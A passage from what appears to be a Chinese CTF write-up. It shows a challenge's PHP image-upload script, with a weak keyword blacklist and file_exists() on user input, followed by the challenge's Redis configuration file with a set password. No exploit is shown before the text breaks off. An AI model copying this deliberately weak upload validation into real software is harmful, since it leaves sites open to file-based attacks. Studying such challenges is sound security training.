class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$tmpname</span>)) &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>, <span class="string">&quot;/var/www/html/check.jpg&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload ok&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;check.jpg&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph|\\\x|&lt;\?/i&quot;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;check.jpg&#x27;</span>)))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;check.jpg&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">getimagesize</span>(<span class="string">&#x27;check.jpg&#x27;</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;check.jpg&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目给的两个文件</p><p>redis.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># Redis configuration file example. # # Note that in order to read the configuration file, Redis must be # started with the file path as first argument: # # ./redis-server /path/to/redis.conf # Note on units: when memory size is needed, it is possible to specify # it in the usual form of 1k 5GB 4M and so forth: # # 1k =&gt; 1000 bytes # 1kb =&gt; 1024 bytes # 1m =&gt; 1000000 bytes # 1mb =&gt; 1024*1024 bytes # 1g =&gt; 1000000000 bytes # 1gb =&gt; 1024*1024*1024 bytes # # units are case insensitive so 1GB 1Gb 1gB are all the same. ################################## INCLUDES ################################### # Include one or more other config files here. This is useful if you # have a standard template that goes to all Redis servers but also need # to customize a few per-server settings. Include files can include # other files, so use this wisely. # # Notice option &quot;include&quot; won&#x27;t be rewritten by command &quot;CONFIG REWRITE&quot; # from admin or Redis Sentinel. Since Redis always uses the last processed # line as value of a configuration directive, you&#x27;d better put includes # at the beginning of this file to avoid overwriting config change at runtime. # # If instead you are interested in using includes to override configuration # options, it is better to use include as the last line. # # include /path/to/local.conf # include /path/to/other.conf ################################## MODULES ##################################### # Load modules at startup. If the server is not able to load modules # it will abort. It is possible to use multiple loadmodule directives. # # loadmodule /path/to/my_module.so # loadmodule /path/to/other_module.so ################################## NETWORK ##################################### # By default, if no &quot;bind&quot; configuration directive is specified, Redis listens # for connections from all the network interfaces available on the server. # It is possible to listen to just one or multiple selected interfaces using # the &quot;bind&quot; configuration directive, followed by one or more IP addresses. # # Examples: # # bind 192.168.1.100 10.0.0.1 # bind 127.0.0.1 ::1 # # ~~~ WARNING ~~~ If the computer running Redis is directly exposed to the # internet, binding to all the interfaces is dangerous and will expose the # instance to everybody on the internet. So by default we uncomment the # following bind directive, that will force Redis to listen only into # the IPv4 loopback interface address (this means Redis will be able to # accept connections only from clients running into the same computer it # is running). # # IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES # JUST COMMENT THE FOLLOWING LINE. # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ bind 127.0.0.1 ::1 # Protected mode is a layer of security protection, in order to avoid that # Redis instances left open on the internet are accessed and exploited. # # When protected mode is on and if: # # 1) The server is not binding explicitly to a set of addresses using the # &quot;bind&quot; directive. # 2) No password is configured. # # The server only accepts connections from clients connecting from the # IPv4 and IPv6 loopback addresses 127.0.0.1 and ::1, and from Unix domain # sockets. # # By default protected mode is enabled. You should disable it only if # you are sure you want clients from other hosts to connect to Redis # even if no authentication is configured, nor a specific set of interfaces # are explicitly listed using the &quot;bind&quot; directive. protected-mode yes # Accept connections on the specified port, default is 6379 (IANA #815344). # If port 0 is specified Redis will not listen on a TCP socket. port 6379 # TCP listen() backlog. # # In high requests-per-second environments you need an high backlog in order # to avoid slow clients connections issues. Note that the Linux kernel # will silently truncate it to the value of /proc/sys/net/core/somaxconn so # make sure to raise both the value of somaxconn and tcp_max_syn_backlog # in order to get the desired effect. tcp-backlog 511 # Unix socket. # # Specify the path for the Unix socket that will be used to listen for # incoming connections. There is no default, so Redis will not listen # on a unix socket when not specified. # # unixsocket /var/run/redis/redis-server.sock # unixsocketperm 700 # Close the connection after a client is idle for N seconds (0 to disable) timeout 0 # TCP keepalive. # # If non-zero, use SO_KEEPALIVE to send TCP ACKs to clients in absence # of communication. This is useful for two reasons: # # 1) Detect dead peers. # 2) Take the connection alive from the point of view of network # equipment in the middle. # # On Linux, the specified value (in seconds) is the period used to send ACKs. # Note that to close the connection the double of the time is needed. # On other kernels the period depends on the kernel configuration. # # A reasonable value for this option is 300 seconds, which is the new # Redis default starting with Redis 3.2.1. tcp-keepalive 300 ################################# GENERAL ##################################### # By default Redis does not run as a daemon. Use &#x27;yes&#x27; if you need it. # Note that Redis will write a pid file in /var/run/redis.pid when daemonized. daemonize yes # If you run Redis from upstart or systemd, Redis can interact with your # supervision tree. Options: # supervised no - no supervision interaction # supervised upstart - signal upstart by putting Redis into SIGSTOP mode # supervised systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET # supervised auto - detect upstart or systemd method based on # UPSTART_JOB or NOTIFY_SOCKET environment variables # Note: these supervision methods only signal &quot;process is ready.&quot; # They do not enable continuous liveness pings back to your supervisor. supervised no # If a pid file is specified, Redis writes it where specified at startup # and removes it at exit. # # When the server runs non daemonized, no pid file is created if none is # specified in the configuration. When the server is daemonized, the pid file # is used even if not specified, defaulting to &quot;/var/run/redis.pid&quot;. # # Creating a pid file is best effort: if Redis is not able to create it # nothing bad happens, the server will start and run normally. pidfile /var/run/redis/redis-server.pid # Specify the server verbosity level. # This can be one of: # debug (a lot of information, useful for development/testing) # verbose (many rarely useful info, but not a mess like the debug level) # notice (moderately verbose, what you want in production probably) # warning (only very important / critical messages are logged) loglevel notice # Specify the log file name. Also the empty string can be used to force # Redis to log on the standard output. Note that if you use standard # output for logging but daemonize, logs will be sent to /dev/null logfile /var/log/redis/redis-server.log # To enable logging to the system logger, just set &#x27;syslog-enabled&#x27; to yes, # and optionally update the other syslog parameters to suit your needs. # syslog-enabled no # Specify the syslog identity. # syslog-ident redis # Specify the syslog facility. Must be USER or between LOCAL0-LOCAL7. # syslog-facility local0 # Set the number of databases. The default database is DB 0, you can select # a different one on a per-connection basis using SELECT where # dbid is a number between 0 and &#x27;databases&#x27;-1 databases 16 # By default Redis shows an ASCII art logo only when started to log to the # standard output and if the standard output is a TTY. Basically this means # that normally a logo is displayed only in interactive sessions. # # However it is possible to force the pre-4.0 behavior and always show a # ASCII art logo in startup logs by setting the following option to yes. always-show-logo yes ################################ SNAPSHOTTING ################################ # # Save the DB on disk: # # save # # Will save the DB if both the given number of seconds and the given # number of write operations against the DB occurred. # # In the example below the behaviour will be to save: # after 900 sec (15 min) if at least 1 key changed # after 300 sec (5 min) if at least 10 keys changed # after 60 sec if at least 10000 keys changed # # Note: you can disable saving completely by commenting out all &quot;save&quot; lines. # # It is also possible to remove all the previously configured save # points by adding a save directive with a single empty string argument # like in the following example: # # save &quot;&quot; save 900 1 save 300 10 save 60 10000 # By default Redis will stop accepting writes if RDB snapshots are enabled # (at least one save point) and the latest background save failed. # This will make the user aware (in a hard way) that data is not persisting # on disk properly, otherwise chances are that no one will notice and some # disaster will happen. # # If the background saving process will start working again Redis will # automatically allow writes again. # # However if you have setup your proper monitoring of the Redis server # and persistence, you may want to disable this feature so that Redis will # continue to work as usual even if there are problems with disk, # permissions, and so forth. stop-writes-on-bgsave-error yes # Compress string objects using LZF when dump .rdb databases? # For default that&#x27;s set to &#x27;yes&#x27; as it&#x27;s almost always a win. # If you want to save some CPU in the saving child set it to &#x27;no&#x27; but # the dataset will likely be bigger if you have compressible values or keys. rdbcompression yes # Since version 5 of RDB a CRC64 checksum is placed at the end of the file. # This makes the format more resistant to corruption but there is a performance # hit to pay (around 10%) when saving and loading RDB files, so you can disable it # for maximum performances. # # RDB files created with checksum disabled have a checksum of zero that will # tell the loading code to skip the check. rdbchecksum yes # The filename where to dump the DB dbfilename dump.rdb # The working directory. # # The DB will be written inside this directory, with the filename specified # above using the &#x27;dbfilename&#x27; configuration directive. # # The Append Only File will also be created inside this directory. # # Note that you must specify a directory here, not a file name. dir /var/lib/redis ################################# REPLICATION ################################# # Master-Replica replication. Use replicaof to make a Redis instance a copy of # another Redis server. A few things to understand ASAP about Redis replication. # # +------------------+ +---------------+ # | Master | ---&gt; | Replica | # | (receive writes) | | (exact copy) | # +------------------+ +---------------+ # # 1) Redis replication is asynchronous, but you can configure a master to # stop accepting writes if it appears to be not connected with at least # a given number of replicas. # 2) Redis replicas are able to perform a partial resynchronization with the # master if the replication link is lost for a relatively small amount of # time. You may want to configure the replication backlog size (see the next # sections of this file) with a sensible value depending on your needs. # 3) Replication is automatic and does not need user intervention. After a # network partition replicas automatically try to reconnect to masters # and resynchronize with them. # # replicaof # If the master is password protected (using the &quot;requirepass&quot; configuration # directive below) it is possible to tell the replica to authenticate before # starting the replication synchronization process, otherwise the master will # refuse the replica request. # # masterauth # When a replica loses its connection with the master, or when the replication # is still in progress, the replica can act in two different ways: # # 1) if replica-serve-stale-data is set to &#x27;yes&#x27; (the default) the replica will # still reply to client requests, possibly with out of date data, or the # data set may just be empty if this is the first synchronization. # # 2) if replica-serve-stale-data is set to &#x27;no&#x27; the replica will reply with # an error &quot;SYNC with master in progress&quot; to all the kind of commands # but to INFO, replicaOF, AUTH, PING, SHUTDOWN, REPLCONF, ROLE, CONFIG, # SUBSCRIBE, UNSUBSCRIBE, PSUBSCRIBE, PUNSUBSCRIBE, PUBLISH, PUBSUB, # COMMAND, POST, HOST: and LATENCY. # replica-serve-stale-data yes # You can configure a replica instance to accept writes or not. Writing against # a replica instance may be useful to store some ephemeral data (because data # written on a replica will be easily deleted after resync with the master) but # may also cause problems if clients are writing to it because of a # misconfiguration. # # Since Redis 2.6 by default replicas are read-only. # # Note: read only replicas are not designed to be exposed to untrusted clients # on the internet. It&#x27;s just a protection layer against misuse of the instance. # Still a read only replica exports by default all the administrative commands # such as CONFIG, DEBUG, and so forth. To a limited extent you can improve # security of read only replicas using &#x27;rename-command&#x27; to shadow all the # administrative / dangerous commands. replica-read-only yes # Replication SYNC strategy: disk or socket. # # ------------------------------------------------------- # WARNING: DISKLESS REPLICATION IS EXPERIMENTAL CURRENTLY # ------------------------------------------------------- # # New replicas and reconnecting replicas that are not able to continue the replication # process just receiving differences, need to do what is called a &quot;full # synchronization&quot;. An RDB file is transmitted from the master to the replicas. # The transmission can happen in two different ways: # # 1) Disk-backed: The Redis master creates a new process that writes the RDB # file on disk. Later the file is transferred by the parent # process to the replicas incrementally. # 2) Diskless: The Redis master creates a new process that directly writes the # RDB file to replica sockets, without touching the disk at all. # # With disk-backed replication, while the RDB file is generated, more replicas # can be queued and served with the RDB file as soon as the current child producing # the RDB file finishes its work. With diskless replication instead once # the transfer starts, new replicas arriving will be queued and a new transfer # will start when the current one terminates. # # When diskless replication is used, the master waits a configurable amount of # time (in seconds) before starting the transfer in the hope that multiple replicas # will arrive and the transfer can be parallelized. # # With slow disks and fast (large bandwidth) networks, diskless replication # works better. repl-diskless-sync no # When diskless replication is enabled, it is possible to configure the delay # the server waits in order to spawn the child that transfers the RDB via socket # to the replicas. # # This is important since once the transfer starts, it is not possible to serve # new replicas arriving, that will be queued for the next RDB transfer, so the server # waits a delay in order to let more replicas arrive. # # The delay is specified in seconds, and by default is 5 seconds. To disable # it entirely just set it to 0 seconds and the transfer will start ASAP. repl-diskless-sync-delay 5 # Replicas send PINGs to server in a predefined interval. It&#x27;s possible to change # this interval with the repl_ping_replica_period option. The default value is 10 # seconds. # # repl-ping-replica-period 10 # The following option sets the replication timeout for: # # 1) Bulk transfer I/O during SYNC, from the point of view of replica. # 2) Master timeout from the point of view of replicas (data, pings). # 3) Replica timeout from the point of view of masters (REPLCONF ACK pings). # # It is important to make sure that this value is greater than the value # specified for repl-ping-replica-period otherwise a timeout will be detected # every time there is low traffic between the master and the replica. # # repl-timeout 60 # Disable TCP_NODELAY on the replica socket after SYNC? # # If you select &quot;yes&quot; Redis will use a smaller number of TCP packets and # less bandwidth to send data to replicas. But this can add a delay for # the data to appear on the replica side, up to 40 milliseconds with # Linux kernels using a default configuration. # # If you select &quot;no&quot; the delay for data to appear on the replica side will # be reduced but more bandwidth will be used for replication. # # By default we optimize for low latency, but in very high traffic conditions # or when the master and replicas are many hops away, turning this to &quot;yes&quot; may # be a good idea. repl-disable-tcp-nodelay no # Set the replication backlog size. The backlog is a buffer that accumulates # replica data when replicas are disconnected for some time, so that when a replica # wants to reconnect again, often a full resync is not needed, but a partial # resync is enough, just passing the portion of data the replica missed while # disconnected. # # The bigger the replication backlog, the longer the time the replica can be # disconnected and later be able to perform a partial resynchronization. # # The backlog is only allocated once there is at least a replica connected. # # repl-backlog-size 1mb # After a master has no longer connected replicas for some time, the backlog # will be freed. The following option configures the amount of seconds that # need to elapse, starting from the time the last replica disconnected, for # the backlog buffer to be freed. # # Note that replicas never free the backlog for timeout, since they may be # promoted to masters later, and should be able to correctly &quot;partially # resynchronize&quot; with the replicas: hence they should always accumulate backlog. # # A value of 0 means to never release the backlog. # # repl-backlog-ttl 3600 # The replica priority is an integer number published by Redis in the INFO output. # It is used by Redis Sentinel in order to select a replica to promote into a # master if the master is no longer working correctly. # # A replica with a low priority number is considered better for promotion, so # for instance if there are three replicas with priority 10, 100, 25 Sentinel will # pick the one with priority 10, that is the lowest. # # However a special priority of 0 marks the replica as not able to perform the # role of master, so a replica with priority of 0 will never be selected by # Redis Sentinel for promotion. # # By default the priority is 100. replica-priority 100 # It is possible for a master to stop accepting writes if there are less than # N replicas connected, having a lag less or equal than M seconds. # # The N replicas need to be in &quot;online&quot; state. # # The lag in seconds, that must be &lt;= the specified value, is calculated from # the last ping received from the replica, that is usually sent every second. # # This option does not GUARANTEE that N replicas will accept the write, but # will limit the window of exposure for lost writes in case not enough replicas # are available, to the specified number of seconds. # # For example to require at least 3 replicas with a lag &lt;= 10 seconds use: # # min-replicas-to-write 3 # min-replicas-max-lag 10 # # Setting one or the other to 0 disables the feature. # # By default min-replicas-to-write is set to 0 (feature disabled) and # min-replicas-max-lag is set to 10. # A Redis master is able to list the address and port of the attached # replicas in different ways. For example the &quot;INFO replication&quot; section # offers this information, which is used, among other tools, by # Redis Sentinel in order to discover replica instances. # Another place where this info is available is in the output of the # &quot;ROLE&quot; command of a master. # # The listed IP and address normally reported by a replica is obtained # in the following way: # # IP: The address is auto detected by checking the peer address # of the socket used by the replica to connect with the master. # # Port: The port is communicated by the replica during the replication # handshake, and is normally the port that the replica is using to # listen for connections. # # However when port forwarding or Network Address Translation (NAT) is # used, the replica may be actually reachable via different IP and port # pairs. The following two options can be used by a replica in order to # report to its master a specific set of IP and port, so that both INFO # and ROLE will report those values. # # There is no need to use both the options if you need to override just # the port or the IP address. # # replica-announce-ip 5.5.5.5 # replica-announce-port 1234 ################################## SECURITY ################################### # Require clients to issue AUTH before processing any other # commands. This might be useful in environments in which you do not trust # others with access to the host running redis-server. # # This should stay commented out for backward compatibility and because most # people do not need auth (e.g. they run their own servers). # # Warning: since Redis is pretty fast an outside user can try up to # 150k passwords per second against a good box. This means that you should # use a very strong password otherwise it will be very easy to break. # # requirepass foobared requirepass 574c941c5987232d337276764d3413c4 # Command renaming. # # It is possible to change the name of dangerous commands in a shared # environment. For instance the CONFIG command may be renamed into something # hard to guess so that it will still be available for internal-use tools # but not available for general clients. # # Example: # # rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52 # # It is also possible to completely kill a command by renaming it into # an empty string: # # rename-command CONFIG &quot;&quot; # # Please note that changing the name of commands that are logged into the # AOF file or transmitted to replicas may cause problems. ################################### CLIENTS #################################### # Set the max number of connected clients at the same time. By default # this limit is set to 10000 clients, however if the Redis server is not # able to configure the process file limit to allow for the specified limit # the max number of allowed clients is set to the current file limit # minus 32 (as Redis reserves a few file descriptors for internal uses). # # Once the limit is reached Redis will close all the new connections sending # an error &#x27;max number of clients reached&#x27;. # # maxclients 10000 ############################## MEMORY MANAGEMENT ################################ # Set a memory usage limit to the specified amount of bytes. # When the memory limit is reached Redis will try to remove keys # according to the eviction policy selected (see maxmemory-policy). # # If Redis can&#x27;t remove keys according to the policy, or if the policy is # set to &#x27;noeviction&#x27;, Redis will start to reply with errors to commands # that would use more memory, like SET, LPUSH, and so on, and will continue # to reply to read-only commands like GET. # # This option is usually useful when using Redis as an LRU or LFU cache, or to # set a hard memory limit for an instance (using the &#x27;noeviction&#x27; policy). # # WARNING: If you have replicas attached to an instance with maxmemory on, # the size of the output buffers needed to feed the replicas are subtracted # from the used memory count, so that network problems / resyncs will # not trigger a loop where keys are evicted, and in turn the output # buffer of replicas is full with DELs of keys evicted triggering the deletion # of more keys, and so forth until the database is completely emptied. # # In short... if you have replicas attached it is suggested that you set a lower # limit for maxmemory so that there is some free RAM on the system for replica # output buffers (but this is not needed if the policy is &#x27;noeviction&#x27;). # # maxmemory # MAXMEMORY POLICY: how Redis will select what to remove when maxmemory # is reached. You can select among five behaviors: # # volatile-lru -&gt; Evict using approximated LRU among the keys with an expire set. # allkeys-lru -&gt; Evict any key using approximated LRU. # volatile-lfu -&gt; Evict using approximated LFU among the keys with an expire set. # allkeys-lfu -&gt; Evict any key using approximated LFU. # volatile-random -&gt; Remove a random key among the ones with an expire set. # allkeys-random -&gt; Remove a random key, any key. # volatile-ttl -&gt; Remove the key with the nearest expire time (minor TTL) # noeviction -&gt; Don&#x27;t evict anything, just return an error on write operations. # # LRU means Least Recently Used # LFU means Least Frequently Used # # Both LRU, LFU and volatile-ttl are implemented using approximated # randomized algorithms. # # Note: with any of the above policies, Redis will return an error on write # operations, when there are no suitable keys for eviction. # # At the date of writing these commands are: set setnx setex append # incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd # sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby # zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby # getset mset msetnx exec sort # # The default is: # # maxmemory-policy noeviction # LRU, LFU and minimal TTL algorithms are not precise algorithms but approximated # algorithms (in order to save memory), so you can tune it for speed or # accuracy. For default Redis will check five keys and pick the one that was # used less recently, you can change the sample size using the following # configuration directive. # # The default of 5 produces good enough results. 10 Approximates very closely # true LRU but costs more CPU. 3 is faster but not very accurate. # # maxmemory-samples 5 # Starting from Redis 5, by default a replica will ignore its maxmemory setting # (unless it is promoted to master after a failover or manually). It means # that the eviction of keys will be just handled by the master, sending the # DEL commands to the replica as keys evict in the master side. # # This behavior ensures that masters and replicas stay consistent, and is usually # what you want, however if your replica is writable, or you want the replica to have # a different memory setting, and you are sure all the writes performed to the # replica are idempotent, then you may change this default (but be sure to understand # what you are doing). # # Note that since the replica by default does not evict, it may end using more # memory than the one set via maxmemory (there are certain buffers that may # be larger on the replica, or data structures may sometimes take more memory and so # forth). So make sure you monitor your replicas and make sure they have enough # memory to never hit a real out-of-memory condition before the master hits # the configured maxmemory setting. # # replica-ignore-maxmemory yes ############################# LAZY FREEING #################################### # Redis has two primitives to delete keys. One is called DEL and is a blocking # deletion of the object. It means that the server stops processing new commands # in order to reclaim all the memory associated with an object in a synchronous # way. If the key deleted is associated with a small object, the time needed # in order to execute the DEL command is very small and comparable to most other # O(1) or O(log_N) commands in Redis. However if the key is associated with an # aggregated value containing millions of elements, the server can block for # a long time (even seconds) in order to complete the operation. # # For the above reasons Redis also offers non blocking deletion primitives # such as UNLINK (non blocking DEL) and the ASYNC option of FLUSHALL and # FLUSHDB commands, in order to reclaim memory in background. Those commands # are executed in constant time. Another thread will incrementally free the # object in the background as fast as possible. # # DEL, UNLINK and ASYNC option of FLUSHALL and FLUSHDB are user-controlled. # It&#x27;s up to the design of the application to understand when it is a good # idea to use one or the other. However the Redis server sometimes has to # delete keys or flush the whole database as a side effect of other operations. # Specifically Redis deletes objects independently of a user call in the # following scenarios: # # 1) On eviction, because of the maxmemory and maxmemory policy configurations, # in order to make room for new data, without going over the specified # memory limit. # 2) Because of expire: when a key with an associated time to live (see the # EXPIRE command) must be deleted from memory. # 3) Because of a side effect of a command that stores data on a key that may # already exist. For example the RENAME command may delete the old key # content when it is replaced with another one. Similarly SUNIONSTORE # or SORT with STORE option may delete existing keys. The SET command # itself removes any old content of the specified key in order to replace # it with the specified string. # 4) During replication, when a replica performs a full resynchronization with # its master, the content of the whole database is removed in order to # load the RDB file just transferred. # # In all the above cases the default is to delete objects in a blocking way, # like if DEL was called. However you can configure each case specifically # in order to instead release memory in a non-blocking way like if UNLINK # was called, using the following configuration directives: lazyfree-lazy-eviction no lazyfree-lazy-expire no lazyfree-lazy-server-del no replica-lazy-flush no ############################## APPEND ONLY MODE ############################### # By default Redis asynchronously dumps the dataset on disk. This mode is # good enough in many applications, but an issue with the Redis process or # a power outage may result into a few minutes of writes lost (depending on # the configured save points). # # The Append Only File is an alternative persistence mode that provides # much better durability. For instance using the default data fsync policy # (see later in the config file) Redis can lose just one second of writes in a # dramatic event like a server power outage, or a single write if something # wrong with the Redis process itself happens, but the operating system is # still running correctly. # # AOF and RDB persistence can be enabled at the same time without problems. # If the AOF is enabled on startup Redis will load the AOF, that is the file # with the better durability guarantees. # # Please check http://redis.io/topics/persistence for more information. appendonly no # The name of the append only file (default: &quot;appendonly.aof&quot;) appendfilename &quot;appendonly.aof&quot; # The fsync() call tells the Operating System to actually write data on disk # instead of waiting for more data in the output buffer. Some OS will really flush # data on disk, some other OS will just try to do it ASAP. # # Redis supports three different modes: # # no: don&#x27;t fsync, just let the OS flush the data when it wants. Faster. # always: fsync after every write to the append only log. Slow, Safest. # everysec: fsync only one time every second. Compromise. # # The default is &quot;everysec&quot;, as that&#x27;s usually the right compromise between # speed and data safety. It&#x27;s up to you to understand if you can relax this to # &quot;no&quot; that will let the operating system flush the output buffer when # it wants, for better performances (but if you can live with the idea of # some data loss consider the default persistence mode that&#x27;s snapshotting), # or on the contrary, use &quot;always&quot; that&#x27;s very slow but a bit safer than # everysec. # # More details please check the following article: # http://antirez.com/post/redis-persistence-demystified.html # # If unsure, use &quot;everysec&quot;. # appendfsync always appendfsync everysec # appendfsync no # When the AOF fsync policy is set to always or everysec, and a background # saving process (a background save or AOF log background rewriting) is # performing a lot of I/O against the disk, in some Linux configurations # Redis may block too long on the fsync() call. Note that there is no fix for # this currently, as even performing fsync in a different thread will block # our synchronous write(2) call. # # In order to mitigate this problem it&#x27;s possible to use the following option # that will prevent fsync() from being called in the main process while a # BGSAVE or BGREWRITEAOF is in progress. # # This means that while another child is saving, the durability of Redis is # the same as &quot;appendfsync none&quot;. In practical terms, this means that it is # possible to lose up to 30 seconds of log in the worst scenario (with the # default Linux settings). # # If you have latency problems turn this to &quot;yes&quot;. Otherwise leave it as # &quot;no&quot; that is the safest pick from the point of view of durability. no-appendfsync-on-rewrite no # Automatic rewrite of the append only file. # Redis is able to automatically rewrite the log file implicitly calling # BGREWRITEAOF when the AOF log size grows by the specified percentage. # # This is how it works: Redis remembers the size of the AOF file after the # latest rewrite (if no rewrite has happened since the restart, the size of # the AOF at startup is used). # # This base size is compared to the current size. If the current size is # bigger than the specified percentage, the rewrite is triggered. Also # you need to specify a minimal size for the AOF file to be rewritten, this # is useful to avoid rewriting the AOF file even if the percentage increase # is reached but it is still pretty small. # # Specify a percentage of zero in order to disable the automatic AOF # rewrite feature. auto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb # An AOF file may be found to be truncated at the end during the Redis # startup process, when the AOF data gets loaded back into memory. # This may happen when the system where Redis is running # crashes, especially when an ext4 filesystem is mounted without the # data=ordered option (however this can&#x27;t happen when Redis itself # crashes or aborts but the operating system still works correctly). # # Redis can either exit with an error when this happens, or load as much # data as possible (the default now) and start if the AOF file is found # to be truncated at the end. The following option controls this behavior. # # If aof-load-truncated is set to yes, a truncated AOF file is loaded and # the Redis server starts emitting a log to inform the user of the event. # Otherwise if the option is set to no, the server aborts with an error # and refuses to start. When the option is set to no, the user requires # to fix the AOF file using the &quot;redis-check-aof&quot; utility before to restart # the server. # # Note that if the AOF file will be found to be corrupted in the middle # the server will still exit with an error. This option only applies when # Redis will try to read more data from the AOF file but not enough bytes # will be found. aof-load-truncated yes # When rewriting the AOF file, Redis is able to use an RDB preamble in the # AOF file for faster rewrites and recoveries. When this option is turned # on the rewritten AOF file is composed of two different stanzas: # # [RDB file][AOF tail] # # When loading Redis recognizes that the AOF file starts with the &quot;REDIS&quot; # string and loads the prefixed RDB file, and continues loading the AOF # tail. aof-use-rdb-preamble yes ################################ LUA SCRIPTING ############################### # Max execution time of a Lua script in milliseconds. # # If the maximum execution time is reached Redis will log that a script is # still in execution after the maximum allowed time and will start to # reply to queries with an error. # # When a long running script exceeds the maximum execution time only the # SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be # used to stop a script that did not yet called write commands. The second # is the only way to shut down the server in the case a write command was # already issued by the script but the user doesn&#x27;t want to wait for the natural # termination of the script. # # Set it to 0 or a negative value for unlimited execution without warnings. lua-time-limit 5000 ################################ REDIS CLUSTER ############################### # Normal Redis instances can&#x27;t be part of a Redis Cluster; only nodes that are # started as cluster nodes can. In order to start a Redis instance as a # cluster node enable the cluster support uncommenting the following: # # cluster-enabled yes # Every cluster node has a cluster configuration file. This file is not # intended to be edited by hand. It is created and updated by Redis nodes. # Every Redis Cluster node requires a different cluster configuration file. # Make sure that instances running in the same system do not have # overlapping cluster configuration file names. # # cluster-config-file nodes-6379.conf # Cluster node timeout is the amount of milliseconds a node must be unreachable # for it to be considered in failure state. # Most other internal time limits are multiple of the node timeout. # # cluster-node-timeout 15000 # A replica of a failing master will avoid to start a failover if its data # looks too old. # # There is no simple way for a replica to actually have an exact measure of # its &quot;data age&quot;, so the following two checks are performed: # # 1) If there are multiple replicas able to failover, they exchange messages # in order to try to give an advantage to the replica with the best # replication offset (more data from the master processed). # Replicas will try to get their rank by offset, and apply to the start # of the failover a delay proportional to their rank. # # 2) Every single replica computes the time of the last interaction with # its master. This can be the last ping or command received (if the master # is still in the &quot;connected&quot; state), or the time that elapsed since the # disconnection with the master (if the replication link is currently down). # If the last interaction is too old, the replica will not try to failover # at all. # # The point &quot;2&quot; can be tuned by user. Specifically a replica will not perform # the failover if, since the last interaction with the master, the time # elapsed is greater than: # # (node-timeout * replica-validity-factor) + repl-ping-replica-period # # So for example if node-timeout is 30 seconds, and the replica-validity-factor # is 10, and assuming a default repl-ping-replica-period of 10 seconds, the # replica will not try to failover if it was not able to talk with the master # for longer than 310 seconds. # # A large replica-validity-factor may allow replicas with too old data to failover # a master, while a too small value may prevent the cluster from being able to # elect a replica at all. # # For maximum availability, it is possible to set the replica-validity-factor # to a value of 0, which means, that replicas will always try to failover the # master regardless of the last time they interacted with the master. # (However they&#x27;ll always try to apply a delay proportional to their # offset rank). # # Zero is the only value able to guarantee that when all the partitions heal # the cluster will always be able to continue. # # cluster-replica-validity-factor 10 # Cluster replicas are able to migrate to orphaned masters, that are masters # that are left without working replicas. This improves the cluster ability # to resist to failures as otherwise an orphaned master can&#x27;t be failed over # in case of failure if it has no working replicas. # # Replicas migrate to orphaned masters only if there are still at least a # given number of other working replicas for their old master. This number # is the &quot;migration barrier&quot;. A migration barrier of 1 means that a replica # will migrate only if there is at least 1 other working replica for its master # and so forth. It usually reflects the number of replicas you want for every # master in your cluster. # # Default is 1 (replicas migrate only if their masters remain with at least # one replica). To disable migration just set it to a very large value. # A value of 0 can be set but is useful only for debugging and dangerous # in production. # # cluster-migration-barrier 1 # By default Redis Cluster nodes stop accepting queries if they detect there # is at least an hash slot uncovered (no available node is serving it). # This way if the cluster is partially down (for example a range of hash slots # are no longer covered) all the cluster becomes, eventually, unavailable. # It automatically returns available as soon as all the slots are covered again. # # However sometimes you want the subset of the cluster which is working, # to continue to accept queries for the part of the key space that is still # covered. In order to do so, just set the cluster-require-full-coverage # option to no. # # cluster-require-full-coverage yes # This option, when set to yes, prevents replicas from trying to failover its # master during master failures. However the master can still perform a # manual failover, if forced to do so. # # This is useful in different scenarios, especially in the case of multiple # data center operations, where we want one side to never be promoted if not # in the case of a total DC failure. # # cluster-replica-no-failover no # In order to setup your cluster make sure to read the documentation # available at http://redis.io web site. ########################## CLUSTER 